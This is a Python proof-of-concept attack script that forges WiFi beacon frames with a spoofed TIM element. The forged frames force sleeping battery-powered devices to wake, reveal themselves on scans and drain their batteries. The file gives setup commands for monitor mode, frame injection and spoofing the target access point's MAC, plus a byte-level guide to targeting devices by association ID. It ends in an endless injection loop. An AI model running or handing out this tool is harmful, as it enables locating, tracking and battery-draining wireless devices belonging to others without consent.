# Made in Australia
# Battery powered wifi devices sleep which can prevent them showing up on a WiFi scan
# Some devices use the TIM component of the non encrypted management frame to wake the device up, if the TIM
# shows there is data waiting for it, it will wake up sending an ACK or NULL frame and await the data
# The Beacon frame and TIM can be spoofed to force a device to wake up and respond with NULL or ACk frames causing it to show up on a scan
# If the device is continually made to respond its battery life may be adversely affected as it can no longer sleep........
#
#
# Changelog
# 0.1 - Proof of concept code
#

from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, hexdump

# README.....
#
# This script will need to be run as SUDO so the packets can be injected, change the appropriate parameters at
# the bottom of this script prior to running it.
# You need to ensure your wifi adapter is in monitor mode / and is capable of supporting frame injection (sudo aireplay-ng --test wlan0)
# The MAC of your adapter needs to be changed to match the target AP or frames will be ignored by the target device
#
# sudo airmon-ng check kill
# sudo airmon-ng start wlan0
# sudo ifconfig wlan0mon down
# IMPORTANT - You need to make sure you also change the MAC oc your adapter.
# sudo macchanger -m A0:00:00:00:00:00 wlan0mon
# sudo ifconfig wlan0mon up
#
#
# Troubleshooting
# Monitor transmitted packets with Wireshark and make sure your channel and MAC settings have changed correctly
# This mismatch causes most of the issues
#
# TIM Construction guide
# 00 00 00 00 00 00
# |  |  |  |  |   \_Virtual Bitmap - Device Association ID's (AID) - This field is used to target a device
# |  |  |  |  |      Client association ID's need to be calculated or iterated to wake up clients
# |  |  |  |  |      A specific client can be targeted if you know the AID from a previous capture
# |  |  |  |  \_Bitmap Control
# |  |  |   \_DTIM Period - How long is the DTIM period
# |  |   \_DTIM Count - Count of DTIM's in period, resets when == DTIM period
# |   \_Tag length
#  \_Tag number - Traffic Indication Map flag
#
# AID Construction
#            Bitmap Control   Virtual Bitmap
#            |                |
#            |                 \ 0000 0000
#            |
#             \ 0000 0000
#               |      | \ Multicast true or false
#               |7 Bits|
#                   \ Offset control for bitmap
#
# e.g Bitmap Control 0x00 masks devices 1-8, 0x01 devices 9-16
# AID Technicaly starts from 0 so is device 0-7 but will be usually shown as device 1-8....
#
# Examples
#
# Control     Mask
# 0000 0000 | 0000 0001 - Device AID 0
# 0000 0000 | 0000 0100 - Device AID 2
# 0000 0000 | 0000 0110 - Device 1 and 2 (0x60)

#
# TODO Commmand line args
# TODO Test if other components of packet are required for other devices
#
__description__ = (
    "Emits forged beacon frames to wake up sleeping devices who rely on DTIM to wake up"
)
__author__ = "facelessg00n"
__version__ = "0.1 Proof of concept"

banner = """
 _____ _                                         _           _     
/  ___| |                                       | |         (_)    
\\ `--.| | ___  ___ _ __    _ __   __ _ _ __ __ _| |_   _ ___ _ ___ 
 `--. \\ |/ _ \\/ _ \\ '_ \\  | '_ \\ / _` | '__/ _` | | | | / __| / __|
/\\__/ / |  __/  __/ |_) | | |_) | (_| | | | (_| | | |_| \\__ \\ \\__ \\
\\____/|_|\\___|\\___| .__/  | .__/ \\__,_|_|  \\__,_|_|\\__, |___/_|___/
                  | |     | |                       __/ |          
                  |_|     |_|                      |___/           
                                                                                                                                                
 """


def tim_packet(ssid, bssid, tim_data, channel):
    dot11 = Dot11(
        type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid
    )
    beacon = Dot11Beacon(cap="ESS+IBSS")
    ssid_element = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    ds_element = Dot11Elt(ID="DSset", info=chr(channel))
    tim_element = Dot11Elt(ID="TIM", info=tim_data)
    frame = RadioTap() / dot11 / beacon / ssid_element / ds_element / tim_element
    return frame


def main():

    # Wakes up devices 1-8 and causes continual ACK emission
    # Bitmask 1111 1111 (0xff)
    tim_data = b"\x0b\x21\x00\xff"

    # Wakes up devices with AID 1 and 2 causes continual ACK emission
    # Bitmask 0000 0110 (0x06)
    # This will cause them to appear on a network scan
    # tim_data=b"\x0b\x21\x00\x06"

    # Causes device 0x01 to emit continual Ack frames
    # Bitmask 0000 0010 (0x02)
    # tim_data = b"\x0b\x21\x00\x02"

    # Causes device 0x02 to emit continual Ack frames
    # Bitmask 0000 0100 - (0x04)
    # tim_data=b"\x0b\x21\x00\x04"

    # Parameters to change

    channel = 6  # Target Channel here
    bssid = "A0:00:00:00:00:00"  # target BSSID
    ssid = "NETGEAR00"  # Target SSID

    forged_frame = tim_packet(ssid, bssid, tim_data, channel)
    print("Packet details")
    forged_frame.show()
    hexdump(forged_frame)
    print(banner)

    # Send packets on wlan0mon every 0.01 seconds forever
    sendInterval = 0.01
    wifiInterface = "wlan0mon"

    print(f"Sending packet every {sendInterval} seconds on {wifiInterface}")
    print(f"Version: {__version__}")
    sendp(forged_frame, iface=wifiInterface, inter=sendInterval, loop=1)


if __name__ == "__main__":
    main()
